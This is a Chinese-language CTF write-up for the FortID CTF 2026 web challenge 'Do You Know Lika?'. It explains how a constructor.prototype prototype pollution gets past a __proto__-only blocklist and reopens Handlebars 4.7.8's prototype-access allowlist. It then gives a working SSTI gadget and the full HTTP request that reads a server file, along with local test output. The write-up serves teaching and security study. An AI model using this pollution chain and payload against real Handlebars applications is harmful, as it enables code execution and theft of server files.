---
title: "Do You Know Lika? — 用 constructor.prototype 污染解锁 Handlebars SSTI (FortID CTF)"
description: FortID CTF web 题：绕过只拦 __proto__ 的校验做原型污染，重新打开 Handlebars 的 proto 访问白名单后 SSTI 读 flag。
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Web ｜ 赛事：FortID CTF 2026 ｜ 关键词：Prototype Pollution、Handlebars SSTI、Node permission model
>
> Flag: `FortID{...}`（需连题目实例获取，本机离线只有 `flag.txt` 占位为 `FortID{redacted}`；但下文的 payload 已在本地 handlebars 4.7.8 上实测把目标文件内容打了出来）

## 题目背景

Lika 旅游局上线了一个"明信片设计器"：你提交一段 Handlebars 模板（`template`）、一份主题 JSON（`theme`）、一份明信片数据 JSON（`model`），服务端会 **spawn 一个全新的 worker 子进程**去渲染，把结果回给你预览。题面问："Can you print the ranger's secret?"——flag 在 `/tmp/lika/flag.txt`。

关键在于这个 worker 子进程是带着 Node 的 **permission model** 跑的（`src/server.js`）：

```js
const WORKER_ARGUMENTS = [
  "--permission",
  "--allow-fs-read=/challenge",
  "--allow-fs-read=/tmp/lika/flag.txt",
  "--max-old-space-size=48",
  WORKER,
];
```

也就是说：**没有 `--allow-child-process`**，所以经典的 `child_process.execSync` 这条路是死的；但 `--allow-fs-read=/tmp/lika/flag.txt` 明确放行了 flag 文件的读取。方向立刻清晰：我要的不是 RCE 执行命令，而是一个能 **`require('fs').readFileSync('/tmp/lika/flag.txt')`** 的 SSTI。

## 源码审计 / 侦察

### 服务端的校验（server.js `validateJob`）

```js
function containsBlockedKey(value, seen = new Set()) {
  ...
  for (const key of Object.keys(value)) {
    if (key === "__proto__") {        // 只拦 __proto__，没拦 constructor / prototype
      return true;
    }
    if (containsBlockedKey(value[key], seen)) return true;
  }
  return false;
}

function validateJob(body) {
  if (typeof body.template !== "string" || body.template.length > 8192) ...
  if (!isRecord(body.theme) || !isRecord(body.model)) ...
  if (containsBlockedKey(body.theme) || containsBlockedKey(body.model)) ...
  if (/\{\{~?\s*>\s*\(/u.test(body.template)) ...         // 禁动态 partial {{> (...)}}
  if (/\{\{~?#\*\s*inline\b/u.test(body.template)) ...     // 禁 inline partial {{#*inline}}
  const partialTag = /\{\{~?#?>~?\s*([^\s}~]+)/gu;         // partial 只允许 @partial-block / myPartial
  ...
}
```

两点非常值得注意：

1. `containsBlockedKey` 只黑名单了字符串键 `"__proto__"`，**完全没管 `constructor` 和 `prototype`**。这几乎是在明示：原型污染要走 `constructor.prototype` 这条链。
2. 模板侧把 Handlebars 里常见的 SSTI 入口（inline partial、动态 partial）都堵了，逼你走别的路。

### worker 的渲染逻辑（worker.js）

```js
function mergeTheme(target, source) {
  for (const [key, value] of Object.entries(source)) {
    if (value !== null && typeof value === "object") {
      target[key] ??= Array.isArray(value) ? [] : {};   // ← ??= 是污染的关键
      mergeTheme(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
...
return template({ ...job.model, theme }, {
  data: rootData,
  partials: safePartials,
  allowProtoMethodsByDefault: false,       // ← 默认禁止访问原型方法
  allowProtoPropertiesByDefault: false,    // ← 默认禁止访问原型属性
});
```

`handlebars` 版本锁死在 **4.7.8**（见 `package.json`）。4.6 以后 Handlebars 默认就会拦截对 `constructor`、`__proto__` 等原型成员的访问，所以这里 `allowProtoMethodsByDefault: false` / `allowProtoPropertiesByDefault: false` 把最常见的 `{{this.constructor.constructor}}` SSTI 直接封死了。这就是这道题的"墙"。

## 关键漏洞

### 漏洞一：`mergeTheme` 经 `constructor.prototype` 做原型污染

`mergeTheme` 用的是 `target[key] ??= ...`——只有当 `target[key]` 为 `null`/`undefined` 时才新建。拿 `theme = {"constructor":{"prototype":{...}}}` 喂进去，递归过程是：

- `target.constructor` 已经存在（继承自 `Object`），`??=` 不赋值 → 递归进 `Object` 这个函数；
- `Object.prototype` 已经存在，`??=` 不赋值 → 递归进 **`Object.prototype` 本体**；
- 再往里的键就被真正写到了 `Object.prototype` 上。

于是 `__proto__` 的黑名单形同虚设。本地实测：

```js
mergeTheme({}, JSON.parse('{"constructor":{"prototype":{"__pp_test":"YES"}}}'));
// Object.prototype.__pp_test === "YES"   ✅ 污染成功
```

### 漏洞二：污染 `allowedProtoProperties` / `allowedProtoMethods` 重新开白名单

Handlebars 在 `createProtoAccessControl(runtimeOptions)` 里构造访问白名单时，读的是 `runtimeOptions.allowedProtoProperties || {}` 和 `runtimeOptions.allowedProtoMethods || {}`。worker 传进去的 options 对象 **只显式写了 `allowProtoMethodsByDefault:false` / `allowProtoPropertiesByDefault:false`，并没有写 `allowedProtoMethods` / `allowedProtoProperties`**——这两个属性在 options 上是 `undefined`，于是会顺着原型链落到我污染过的 `Object.prototype` 上！

白名单里被显式标 `true` 的键，会覆盖 `defaultValue:false`。所以我只要污染出：

```json
"allowedProtoMethods":    {"constructor": true, "sub": true, "split": true, "pop": true, "push": true, "apply": true},
"allowedProtoProperties": {"constructor": true}
```

就把 `constructor` 以及后面 gadget 要用到的几个 `String.prototype` / `Array.prototype` 方法重新放行了，等于把 4.7.8 的防护退回到"可以摸 constructor"的时代。

## 利用步骤

### 1）构造污染用的 theme

```json
{
  "constructor": {
    "prototype": {
      "allowedProtoMethods":    {"constructor": true, "sub": true, "split": true, "pop": true, "push": true, "apply": true},
      "allowedProtoProperties": {"constructor": true}
    }
  }
}
```

全程不含 `__proto__` 键，顺利过 `containsBlockedKey`。

### 2）SSTI 模板：拿到 `Function` 构造器、以文件读取为 body 造函数、再触发执行

白名单开了之后，就能用 Handlebars 的经典 gadget：从字符串 `"s"` 拿 `String.prototype.sub`，`lookup` 出它的 `constructor`（即 `Function`），把要执行的代码塞进数组，再用 `apply` 造出函数；Handlebars 对"上下文里是函数的值"会按 lambda 自动调用，于是函数被执行、返回值被输出。因为子进程禁了 child_process，我把 body 写成 **读 flag 文件**：

```handlebars
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require('fs').readFileSync('/tmp/lika/flag.txt','utf8')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

这里为什么成立：

- `string.sub` 是 `String.prototype.sub`（函数），`lookup string.sub "constructor"` 取到 **`Function`**——这一步只有在 `allowedProtoMethods.constructor=true` 时才不会被拦。
- `split` / `string.split` 返回数组，`pop`/`push` 把数组内容替换成 `[Function]` 和 `["return ...readFileSync..."]`——这些数组方法都在我污染出的白名单里。
- `string.sub.apply 0 codelist` 用 `apply` 以干净的参数数组（只有那一段代码字符串）调用 `Function`，造出 `function(){ return require('fs').readFileSync('/tmp/lika/flag.txt','utf8') }`。
- 这个新函数作为 `{{#with ...}}` 的值，`{{this}}` 输出时被 Handlebars 当 lambda **自动调用**，于是 flag 文件内容被读出来拼进渲染结果。

### 3）完整请求

```http
POST /api/preview HTTP/1.1
Host: <target>
Content-Type: application/json

{"template":"{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require('fs').readFileSync('/tmp/lika/flag.txt','utf8')\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}","theme":{"constructor":{"prototype":{"allowedProtoMethods":{"constructor":true,"sub":true,"split":true,"pop":true,"push":true,"apply":true},"allowedProtoProperties":{"constructor":true}}}},"model":{}}
```

返回的 JSON `output` 字段里，中间会混有 gadget 产生的噪声（`[object Object]`、`function Function() { [native code] }` 之类），**末尾那一段就是 flag 文件的内容**。

### 本地验证

我用 `handlebars@4.7.8` 原样复刻了 worker 的 `mergeTheme` + `render`（同样的 options、同样的 `safePartials`/`rootData`），把目标路径指向一个假 flag：

```
OUT: "e2[object Object]function Function() { [native code] }2[object Object]FortID{FAKE_LOCAL_TEST}\n"
```

末尾 `FortID{FAKE_LOCAL_TEST}` 正是被读出来的文件内容；同时把上面的完整 body 丢进 server 原版的 `validateJob`，返回 `null`（即通过校验，模板长度 414 < 8192）。说明 payload 对"校验层"和"渲染层"都成立，换到线上实例把路径保持 `/tmp/lika/flag.txt` 即可拿真 flag。

## Flag

`FortID{...}`（需连题目实例获取；离线 dump 中 `flag.txt` 为 `FortID{redacted}` 占位）

## 小结 / 收获

- **黑名单只写一半等于没写**：只拦 `__proto__` 却放过 `constructor.prototype`，`??=` 的"已存在就不覆盖"语义反而成了直通 `Object.prototype` 的梯子。
- **Handlebars 4.7.8 的 proto 防护不是密封的**：它的白名单键 `allowedProtoMethods/Properties` 是从 runtime options 上读的，而 options 没显式设置就会落到原型链——原型污染能把这道防护整个"退版"。
- **先看运行环境再定利用目标**：`--permission` 放行了 fs 读、却没放 child_process，所以这道题要的是"文件读取型 SSTI"而不是命令执行，payload 的 body 直接写 `readFileSync` 才是对的。
